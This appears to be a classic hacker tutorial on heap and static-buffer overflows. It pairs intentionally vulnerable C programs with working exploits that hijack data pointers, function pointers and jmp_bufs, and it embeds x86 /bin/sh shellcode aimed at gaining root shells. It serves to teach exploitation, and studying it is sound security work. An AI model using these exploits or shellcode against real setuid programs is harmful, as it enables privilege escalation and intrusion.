@@ -1,0 +1,537 @@
+		 	Heap Overflows by example
+		    +-=-+-=-+-=-+-=-+-=-+-=-+-=-+-=-+
+
+				   By lamagra<access-granted@geocities.com>
+
+
+----[ Introduction
+
+First of all, i made this a "by example" because i find heap overflow
+more simple then stack based. Although heap based can be quite difficult 
+from time to time. Second: i think examples explain it so much better
+than all that text.
+
+The heap is an area in the memory that is dynamically allocated using
+functions: malloc(3), calloc(3). Also global and static buffers can be
+exploited in the same manner. 
+To show the concept of an heap overflow, I wrote this little example
+program.
+
+<++> heap/example.c
+/* A simple demonstration of a heap based overflow */
+#include <stdio.h>
+
+int main()
+{
+  long diff,size = 8;
+  char *buf1;
+  char *buf2;
+
+  buf1 = (char *)malloc(size);
+  buf2 = (char *)malloc(size);
+  if(buf1 == NULL || buf2 == NULL)
+  {
+	perror("malloc");
+	exit(-1);
+  }
+
+  diff =  (long)buf2 -  (long)buf1;
+  printf("buf1 = %p & buf2 = %p & diff %d\n",buf1,buf2,diff);
+  memset(buf2,'2',size);
+  printf("BEFORE: buf2 = %s\n",buf2);
+  memset(buf1,'1',diff+3);  /* We overwrite 3 chars */
+  printf("AFTER:  buf2 = %s\n",buf2);
+
+  return 0;
+}
+<-->
+
+darkstar:~/heap# gcc example.c -o example
+darkstar:~/heap# example
+buf1 = 0x804a5f8 & buf2 = 0x804a608 & diff = 16
+BEFORE: buf2 = 22222222
+AFTER:  buf2 = 11122222
+darkstar:~/heap# 
+
+Instead of using malloc() we could make the pointers (buf1 and buf2)
+static. The result will remain the same. 
+
+
+--------[ Overwriting data
+
+<++> heap/hole1.c
+/*
+ *   This is a simple example with a heap overflow inside.
+ *   All that it does is get the user's uid/gid and execute a shell.
+ */
+#include <stdio.h>
+#include <pwd.h>
+
+struct passwd *pwd;
+char buf[32];
+
+int main(int argc, char **argv)
+{
+ 
+ if((pwd = getpwuid(getuid())) == NULL)
+ {
+   perror("Who are you");
+   exit(-1);
+ }
+
+ if(argc == 2) strcpy(buf,argv[1]);
+
+ setregid(pwd->pw_gid,pwd->pw_gid);
+ setregid(pwd->pw_gid,pwd->pw_uid);
+ execl(pwd->pw_shell,pwd->pw_shell,NULL);
+}
+<-->
+
+As you can see this is a fairly program and the overflow is quite obvious.
+The exploit is also easy too make.
+
+<++> heap/exploit1.c
+/* This is the overwrite exploit example */
+#include <stdio.h>
+#include <fcntl.h>
+#include <pwd.h>
+
+#define BUFSIZE 32
+
+int main(int argc,char **argv)
+{
+  int diff = 16; /* Estimated diff */
+  struct passwd *pwd;
+  char *buf;
+
+  if(argc != 2)
+  {
+	printf("Usage: %s <program>\n",argv[0]); 
+  }
+
+  if((pwd = getpwuid(getuid())) == NULL)
+  {
+	printf("You're unknown, filling in arbitrary values\n");
+	memset(pwd,NULL,sizeof(struct passwd));
+	pwd->pw_shell="/bin/sh";
+  }
+  
+  pwd->pw_uid = pwd->pw_gid = 0;
+
+  buf = malloc(BUFSIZE + diff + sizeof(struct passwd));
+  if(buf == NULL)
+  {
+	printf("Malloc error\n");
+	exit(-1);
+  }
+ 
+  memset(buf,'A',BUFSIZE + diff);
+  strcpy(buf+BUFSIZE+diff,pwd);
+
+  execl(argv[1],argv[1],buf,NULL);  
+  return -1;
+}
+<-->
+
+darkstar:~/heap#  gcc hole1.c -ohole
+darkstar:~/heap#  gcc exploit1.c -oexpl 
+darkstar:~/heap$  expl hole 
+darkstar:~/heap# 
+
+
+--------[ Overwriting pointers
+
+
+Our next example will do something even more useful, it'll overwrite a
+pointer.
+
+<++> heap/example2.c 
+/* Another simple demonstration of a heap based overflow . This time
+   overwriting pointers.
+*/
+#include <stdio.h>
+
+int main()
+{
+  long diff;
+  static char buf1[16], *buf2;
+
+  buf2 = buf1;
+  diff =  (long)&buf2 -  (long)buf1;
+  printf("buf1 = %p & buf2 = %p & diff %d\n",buf1,&buf2,diff);
+  printf("BEFORE: buf2 = %p\n",buf2);
+  /* An address is 4 long, so we overwrite 4 chars */
+  memset(buf1,'A',diff+4);  
+  printf("AFTER:  buf2 = %p\n",buf2);
+
+  return 0;
+}
+<-->
+darkstar:~/heap# gcc example2.c -o example2
+darkstar:~/heap# example2
+buf1 = 0x804a55c & buf2 = 0x804a56c & diff = 16
+BEFORE: buf2 = 0x804a55c
+AFTER:  buf2 = 0x41414141
+darkstar:~/heap# 
+
+When we run the program, we can all see that the pointer (buf2) points to
+a different address then before. Usesable? Ofcourse, I'll show in the
+following examples.
+
+<++> heap/hole2.c
+/* Our vunerable program, really easy to exploit.*/
+#include <stdio.h>
+#include <fcntl.h>
+
+int main()
+{
+  static char buf[16], *tempor;
+  int fd;
+
+  tempor = tempnam(NULL,NULL);
+  printf("BEFORE: tempor = %s\n",tempor);
+  printf("Input data to write to file\n");
+  
+  gets(buf);
+  printf("AFTER:  tempor = %s\n",tempor);
+
+  fd = open(tempor,O_WRONLY|O_CREAT,0644);
+  fchown(fd,getuid(),getgid()); /* Change ownership */
+  write(fd,buf, strlen(buf));
+  close(fd);
+
+  return 0;
+}
+<-->
+
+And here is the exploit:
+
+<++> heap/exploit2.c
+/* This is the overwrite exploit example */
+#include <stdio.h>
+#include <fcntl.h>
+
+unsigned long get_esp()
+{
+  asm("movl %esp,%eax"); 
+}
+
+#define BUFSIZE 16
+
+int main(int argc,char **argv)
+{
+  char *buf;
+  long addr;
+
+  if(argc != 3)
+  {
+	printf("Usage: %s <program> <offset>\n",argv[0]); 
+  }
+
+  buf = malloc(BUFSIZE + sizeof(long));
+  if(buf == NULL)
+  {
+	printf("Malloc error\n");
+	exit(-1);
+  }
+ 
+  memset(buf,'A',BUFSIZE);
+  addr = get_esp() + atoi(argv[2]);
+  printf("Using address 0x%x\n",addr);
+  *(long *)&buf[BUFSIZE] = addr;
+
+  execl(argv[1],argv[1],buf,"/tmp/secret",NULL);  
+  return -1;
+}
+<-->
+
+This is what happens:
+
+darkstar:~/heap# gcc hole2.c -ovun
+darkstar:~/heap# gcc exploit2.c -oexpl
+darkstar:~/heap$ expl vun 280
+Using address 0xbffffc0c
+BEFORE: tempor = /tmp/00397aaa
+AFTER:  tempor = /tmp/secret
+darkstar:~/heap# ls -l /tmp/secret
+-rw-r--r--   1 lamagra lamagra      22 Sep 27 19:58 /tmp/secret
+darkstar:~/heap# 
+
+Heheh, think what it can do with /etc/shadow
+As you can see the pointer (tempor) get overwritten so that it points to
+argv[2] on the stack. The same thing can be done with pointers to
+functions, as demonstrated in the next example.
+
+
+<++> heap/hole3.c
+#include <fcntl.h>
+
+int bla(char *text)
+{
+  puts(text);
+}
+
+int main(int argc, char **argv)
+{
+  static char buf[16];
+  static int (*funct)(char *);
+
+  if(argc < 3)
+  {
+	printf("Usage: %s <contents> <text>\n",argv[0]);
+	exit(-1);
+  }
+  
+  funct = (int (*)(char *))bla; 
+
+  printf("BEFORE: funct = 0x%x\n",funct);
+  
+  strcpy(buf,argv[1]);
+
+  printf("AFTER:  funct = 0x%x\n",funct);
+
+  (int)(*funct)(argv[2]);   
+  return 0;
+}
+<-->
+
+This exploit can be exploited in different ways ie. :
+	
+	o changing the pointer to a libc-function (system())
+	o changing it to point to the stack (shellcode is located there)
+	o changing it to point to the heap (shellcode in there)
+
+The heap and the libc-function are the best ways to do it. It gets around 
+non-exec stack, stackguard, etc. And the offsets are calculated very easily.
+
+I'm only going to include the heap based sploit and leave the rest as an
+exercise to you and all other readers.
+
+<++> heap/exploit3.c
+/* This is the overwrite function pointer exploit example */
+/* Uses heap */
+
+#include <stdio.h>
+
+#define BUFSIZE 200
+
+/* Standard x86 linux shellcode */
+char code[] =
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+int main(int argc,char **argv)
+{
+  char *buf;
+  long addr;
+  void *handle;
+
+  if(argc != 3)
+  {
+	printf("Usage: %s <program> <address>\n",argv[0]); 
+	exit(-1);
+  }
+
+  addr = strtoul(argv[2],0,0);
+
+  buf = malloc(BUFSIZE + sizeof(long));
+  if(buf == NULL)
+  {
+	printf("Malloc error\n");
+	exit(-1);
+  }
+  printf("buf 0x%x\n",buf);
+ 
+  memset(buf,0x90,BUFSIZE); 	/* fill the buf so that it's filled to the top*/ 
+  memcpy(buf,code,sizeof(code)-1);
+  printf("Using address 0x%x\n",addr);
+  *(long *)&buf[BUFSIZE] = addr;
+
+  execl(argv[1],argv[1],buf,"blah",NULL); 
+  return -1;
+}
+<-->
+
+To use this exploit you must first get the exact address of the "buf" in
+hole3. To get this addy, you can use a serie of programs, i find the
+following the most simple.
+
+darkstar:~/heap# nm <program> | grep buf
+0804a5f8 b buf.4
+darkstar:~/heap# 
+
+And voila we already got the EXACT offset in memory. (Another advantage of
+heap based overflows) 
+
+
+--------[ Overwriting jumpbuffers
+
+Jumpbuffers are use for returning to another position on the program when
+an error occurs. Check functions setjmp(3), longjmp(3) and sigsetjmp(3).
+This is what a jmpbuf looks like:
+
+<snip> From i386/jmp_buf.h <snip>
+
+typedef struct __jmp_buf_base
+  {
+    long int __bx, __si, __di;
+    __ptr_t __bp;
+    __ptr_t __sp;
+    __ptr_t __pc;
+  } __jmp_buf[1];
+
+<end snip> From i386/jmp_buf.h <end snip>
+
+(note: on some systems a jmpbuf is an array of longs)
+
+setjmp(3) saves the current instruction, stack pointer and some other
+	  registers.
+longjmp(3) restores the values saved by setjmp(3). 
+
+<++> heap/hole4.c
+#include <fcntl.h>
+#include <setjmp.h>
+
+int main(int argc, char **argv)
+{
+  static char buf[200];
+  static jmp_buf jmpbuf;
+
+  if(argc < 2)
+  {
+	printf("Usage: %s <contents>\n",argv[0]);
+	exit(-1);
+  }
+  
+  if(setjmp(jmpbuf))
+  {
+	printf("Sploit failed\n");
+	exit(-1);
+  }
+
+  printf("BEFORE:\n");
+  printf("\tbx = 0x%x\n\tbp = 0x%x\n\tsp = 0x%x\n\tpc = 0x%x\n",
+	jmpbuf->__bx,jmpbuf->__bp,jmpbuf->__sp,jmpbuf->__pc);
+
+  strcpy(buf,argv[1]);
+
+  printf("AFTER:\n");
+  printf("\tbx = 0x%x\n\tbp = 0x%x\n\tsp = 0x%x\n\tpc = 0x%x\n",
+	jmpbuf->__bx,jmpbuf->__bp,jmpbuf->__sp,jmpbuf->__pc);
+  
+  longjmp(jmpbuf,1);
+  return 0;
+}
+<-->  
+
+<++> heap/exploit4.c
+/* This is the overwrite jmpbuf exploit example */
+/* Uses heap */
+
+#include <stdio.h>
+
+#define BUFSIZE 200
+
+/* Standard x86 linux shellcode */
+char code[] =
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+int main(int argc,char **argv)
+{
+  char *buf;
+  long addr;
+  void *handle;
+  long stack = 0xbffffbc0;
+
+  if(argc != 3)
+  {
+	printf("Usage: %s <program> <address>\n",argv[0]); 
+	exit(-1);
+  }
+
+  addr = strtoul(argv[2],0,0);
+
+  buf = malloc(BUFSIZE + sizeof(long));
+  if(buf == NULL)
+  {
+	printf("Malloc error\n");
+	exit(-1);
+  }
+ 
+  memset(buf,0x90,BUFSIZE + 4*4); 
+  /* fill the buf so that it's filled to the top*/ 
+  memcpy(buf,code,strlen(code));
+  printf("Using address 0x%x\n",addr);
+  *(long *)&buf[BUFSIZE + 4*4] = stack;  
+  /* gotta overwrite the stack pointer with a good value else we get a
+	segfault at the call in the shellcode 
+  */
+  *(long *)&buf[BUFSIZE + 4*5] = addr;
+
+  execl(argv[1],argv[1],buf,"blah",NULL); 
+  return -1;
+}
+<-->  
+
+(note: In this exploit we could place the shellcode on the stack (argv[]),
+	but  in this example i also use the heap.)
+
+--------[ Overwriting io-structs
+
+Function like fopen(3), ldopen(3), popen(3),  fdopen(3), etc use a
+allocated structure on the data-section. This too can be overwritten in
+some way. The contents of the struct is the following:
+
+<snip> From libio.h <snip>
+
+struct _IO_FILE {
+  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
+  /* The following pointers correspond to the C++ streambuf protocol. */
+  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
+  char* _IO_read_ptr;	/* Current read pointer */
+  char* _IO_read_end;	/* End of get area. */
+  char* _IO_read_base;	/* Start of putback+get area. */
+  char* _IO_write_base;	/* Start of put area. */
+  char* _IO_write_ptr;	/* Current put pointer. */
+  char* _IO_write_end;	/* End of put area. */
+  char* _IO_buf_base;	/* Start of reserve area. */
+  char* _IO_buf_end;	/* End of reserve area. */
+  /* The following fields are used to support backing up and undo. */
+  char *_IO_save_base; /* Pointer to start of non-current get area. */
+  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
+  char *_IO_save_end; /* Pointer to end of non-current get area. */
+
+  struct _IO_marker *_markers;
+  
+  struct _IO_FILE *_chain;
+  
+  int _fileno;
+  int _blksize;
+  _IO_off_t _offset;
+  
+  unsigned short _cur_column;
+  char _unused;
+  char _shortbuf[1];
+  
+  /*  char* _save_gptr;  char* _save_egptr; */
+
+  struct _IO_lock_t _IO_lock;
+};
+
+<end snip> From libio.h <end snip>
+
+I'm leaving this entirely as an exercise to the readers.
+Interesting is eg. changing fileno to stdin, so the program read from
+stdin instead of the file.
+
+
+---------[ Real life examples
+
+Wu-ftpd has a heap-overflow which happens when changing dirs.
+Since my exploit is private i'm not including it in this paper.
+
+---------[ EOF
+ 
